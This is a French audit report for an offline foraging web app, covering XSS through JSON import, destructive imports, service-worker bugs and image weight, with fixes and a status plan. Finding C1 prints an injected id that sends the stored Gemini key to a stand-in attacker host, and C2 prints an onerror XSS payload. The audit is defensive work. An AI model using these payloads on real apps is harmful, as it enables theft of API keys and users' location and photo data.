# Audit webapp complet — Cueillette Québec (édition Memphis)

| | |
|---|---|
| **Projet** | cueillette-memphis — PWA 100 % hors-ligne, mono-fichier statique (index.html 182,5 Ko, sw.js 5,7 Ko) |
| **Commit audité** | `5ab9b89` (archive critique 29e) — SW cqm-v57 |
| **Date** | 16 août 2026 |
| **Méthode** | 3 audits parallèles (sécurité · qualité code · performance/PWA/UX) + examen croisé coordonnateur (chaque constat haute sévérité re-vérifié par read_file/grep/Python) |
| **Rapports détaillés** | `docs/AUDIT_SECU.md` (18 constats) · `docs/AUDIT_QUALITE.md` (27) · `docs/AUDIT_PERF.md` (13) |

## Résumé exécutif

**3 critiques · 15 majeurs · 25 mineurs** (46 constats, après écarts : 1 faux positif écarté — « SW jamais installé », le chemin `img/specs/credits.json` existe et est correctement référencé).

Le socle défensif est **bon** : aucune clé Gemini dans le bundle/SW/export, `esc()` quasi systématique, croisement guide-vs-IA avec échelle de gravité, tombes de sécurité, EXIF strippé, exclusions réseau du SW correctes, offline-first 135/135 ressources prouvé. **Les failles sérieuses se concentrent sur un seul point d'entrée : l'import JSON**, qui accepte des données non validées (ids, statuts, images) réinjectées dans des `innerHTML` avec handlers `onclick` non échappés.

| Sévérité | Sécurité | Qualité | Perf | Total |
|---|---|---|---|---|
| Critique | 2 | 1 | 0 | **3** |
| Majeur | 6 | 6 | 3 | **15** |
| Mineur | 9 | 18 | 10 | **37** → 25 (doublons fusionnés) |
| Positifs | 9 | — | 7 | 16 |

## Constats CRITIQUES

### C1 — XSS persistant via import JSON : ids non échappés dans les handlers `onclick` inline
`index.html:1288-1290, 1451, 1503-1506, 1588-1589` (ids interpolés bruts) ; point d'entrée : import `index.html:2660-2701` (ids écrits tels quels).
**Impact** : un fichier JSON piégé — via le flux officiel « transfert vers un autre téléphone » — avec `"id": "x');fetch('https://attaque/?k='+localStorage.getItem('cqm_cle_ia'));//"` exécute du code arbitraire au clic : **vol de la clé Gemini + exfiltration de toutes les données locales** (GPS, photos, journal). Équivalent PWA d'un document Office macro.
**Fix** : (a) bannir l'interpolation de données dans les `onclick` → `data-*` + délégation ; (b) valider les ids à l'import `^[A-Za-z0-9_-]{1,64}$` (ou régénérer avec `uid()`) ; (c) CSP.

### C2 — XSS via images/URLs importées (`src` et `onclick` lightbox)
`index.html:1492, 1237-1238, 1279, 1513, 1580, 2440` ; import `index.html:2681-2694` (photos non validées).
**Impact** : `"photo": "\" onerror=\"alert(1)"` s'exécute au rendu — mêmes conséquences que C1.
**Fix** : valider chaque URL d'image à l'import (data:image/(jpeg|png|webp);base64, OU https:// domaines connus OU `img/` + regex sûre) ; lightbox via `this.src`, jamais de handler reconstruit depuis une valeur stockée.

### C3 — Import destructif : données effacées AVANT que l'import ne soit garanti
`index.html:2680` (vider() les 7 stores) puis écritures séquentielles sans transaction ni restauration ; catch affiche « Fichier invalide » mensonger.
**Impact** : un échec en cours d'import (quota — plausible avec photos data-URL) = **toutes les données actuelles détruites + import partiel**. Pire scénario possible pour une app dont le produit EST la donnée.
**Fix** : écrire dans une transaction IDB multi-stores unique (ou stores temporaires puis bascule), restaurer l'état précédent sur échec, message honnête distinct de « fichier invalide ».

## Constats MAJEURS (par domaine)

**Sécurité / intégrité des données**
- **M1** — Statuts non validés à l'import (tombes/especes/supprimees) → un fichier altéré peut badger VERT une espèce mortelle (`index.html:2683-2693`). Fix : whitelist unique `comestible|prudence|immangeable|toxique|mortel|inconnu`, invalide → `inconnu` (jamais `comestible`).
- **M2** — `especeId` incohérent avec le nom → badge d'une autre espèce (`index.html:1573-1579`). Fix : re-vérifier nom↔id au rendu, le plus grave gagne.
- **M3** — Fail-safe IA hors-guide : badge « ✅ Comestible » vert sans alerte pour les 3 917 espèces hors guide (`index.html:2519-2525`). Fix : mention « ⚠️ Espèce absente du guide — vérifiez avec un expert » + « En cas de doute, on ne mange pas » ; renforcer le prompt anti-injection.
- **M4** — Variété perso homonyme d'une espèce plus grave : la FICHE affiche un badge vert après confirmation de collision (`index.html:1899-1901, 1453, 1514`). Fix : « le plus grave gagne à l'affichage, partout ».
- **M5** — Échecs d'écriture IndexedDB non gérés : ~20 appels sans try/catch, perte silencieuse (quota photos) (`index.html:1380-1383, 1672-1675, 1917-1921`). Fix : wrapper + toast « ⚠️ Stockage plein ? ».

**Qualité code**
- **M6** — 103 noms MyCoQuébec avec apostrophe cassent les boutons d'autocomplétion (esc() → `&#39;` décodé avant compilation JS → SyntaxError) + vecteur XSS (`index.html:1604, 1723`). Fix : `data-*` + délégation (corrige bug ET XSS).
- **M7** — `recharger()`/`init` sans filet : un store corrompu = app blanche (`index.html:2793-2838`). Fix : try/catch + rendu dégradé + `window.onerror`.
- **M8** — Install SW tout-ou-rien : une ressource manquante = zéro offline (`sw.js:143-145`). Fix : socle en `addAll` + images en `add()` individuel avec catch.
- **M9** — Fallback réseau sert `index.html` pour TOUTE requête en échec, y compris images (`sw.js:159-164`) + `activate` purge TOUS les caches de l'origine (`sw.js:147-151`). Fix : fallback navigate-only + purge préfixée `cqm-` + exclure mycoquebec.org.
- **M10** — Monolithes de rendu + blocs d'alerte sécurité (antipoison) dupliqués 2-4× (`ouvrirDetail` 66 l., `analyserPhoto` 89 l.). Fix : extraire `alerteStatut()` + `gabaritVerdict()` — contenu de sécurité critique, une seule source.

**Performance / PWA**
- **M11** — 105 photos specs non optimisées : 22,9 Mo (89 % du précache), jusqu'à 474 Ko, 960 px croppés en 16/9 à l'affichage. Fix : recompression q78-82 sans métadonnées → ~10-12 Mo économisés.
- **M12** — Google Fonts jamais précachée : police signature Fredoka absente hors-ligne (render-blocking en ligne). Fix : self-host woff2 dans FICHIERS.
- **M13** — Cache runtime empoisonnable : `c.put` sans vérif `r.ok` → un 404 transitoire servi indéfiniment (`sw.js:160-163`). Fix : `if (r.ok || r.type === 'opaque')`.

## Points positifs à préserver
1. **Aucune clé Gemini dans le bundle/SW/export** ; SW exclut `key=` du cache.
2. **Croisement guide-vs-IA** : le statut du guide (ou tombe) a le dernier mot, coercition du vocabulaire, seuils 90 %/60 %.
3. **Filet de sécurité des noms** : Levenshtein ≤ 2, synonymes, base complète (masquées/supprimées/tombes).
4. **EXIF strippé** par le canvas (ni GPS, ni exports, ni Gemini).
5. **Offline-first 135/135 prouvé** — 0 fichier manquant, 0 référence cassée (vérifié par script).
6. **Interactions terrain à mise à jour ciblée** (`basculerSpec` toggle de classe, pas de rebuild).
7. **Pas de CLS** : dimensions réservées partout, lazy loading.
8. Doubles confirmations destructives, `rel="noopener"` partout, repli localStorage.

## Plan d'action en 3 phases

### Phase 1 — Urgent (sécurité : le seul point d'entrée)
| Action | Effort | Gain | Statut |
|---|---|---|---|
| C1+C2 : bannir l'interpolation `onclick` (data-* + délégation) sur spots/cueillettes/détail/illu | 3-4 h | Élimine XSS import + corrige les 103 apostrophes (M6) | ✅ **CORRIGÉ** (`71dfbc5`) |
| C3 : import transactionnel (stores temporaires → bascule, restauration sur échec) | 2 h | Plus aucune perte de données possible à l'import | ✅ **CORRIGÉ** (`71dfbc5`) |
| M1 : whitelist statuts à l'import + validation ids `^[A-Za-z0-9_-]{1,64}$` | 1 h | Le filet tient même sur fichier altéré | ✅ **CORRIGÉ** (`71dfbc5`) |
| M2+M4 : « le plus grave gagne » à l'affichage partout + re-vérif nom↔id | 1-2 h | Plus jamais de vert sur un nom mortel | ✅ **CORRIGÉ** (`71dfbc5`) |

### Phase 2 — Court terme (2-3 semaines)
| Action | Effort | Gain | Statut |
|---|---|---|---|
| M3 : badge vert hors-guide + mention « absente du guide » + anti-prompt-injection | 1 h | Risque résiduel d'intoxication réduit | ⬜ OUVERT |
| M5 : wrapper écritures + toast stockage plein + `unhandledrejection` | 2 h | Plus de perte silencieuse | ⬜ OUVERT |
| M7 : filet `recharger()` + JSON.parse protégé | 1-2 h | App jamais blanche | ⬜ OUVERT |
| M8+M9 : SW durci (install résiliente, fallback navigate-only, purge `cqm-`) | 2 h | Offline robuste + origine GitHub Pages propre | ⬜ OUVERT |
| M11 : recompression des 105 specs (~10-12 Mo) | 1-2 h script | Installation 40 % plus légère | ✅ **CORRIGÉ** (`71dfbc5`, 22,9 → 18,6 Mo = −18,9 %) |

### Phase 3 — Moyen terme
| Action | Effort | Gain | Statut |
|---|---|---|---|
| M10 : extraire `alerteStatut()`/`gabaritVerdict()` (source unique antipoison) | 2-3 h | Sécurité critique mono-source | ⬜ OUVERT |
| M12 : self-host Fredoka woff2 | 1 h | Identité visuelle hors-ligne | ⬜ OUVERT |
| CSP meta (connect-src whitelist) + `x-goog-api-key` | 1 h | Défense en profondeur | ⬜ OUVERT |
| Debounce autocomplétion MyCoQuébec + recherche guide | 1 h | Fluidité mobile | ⬜ OUVERT |

---
*Constats critiques à confirmer dynamiquement (navigateur) avant correction — l'audit est statique. Chantiers de correction proposés séparément avec accord explicite.*
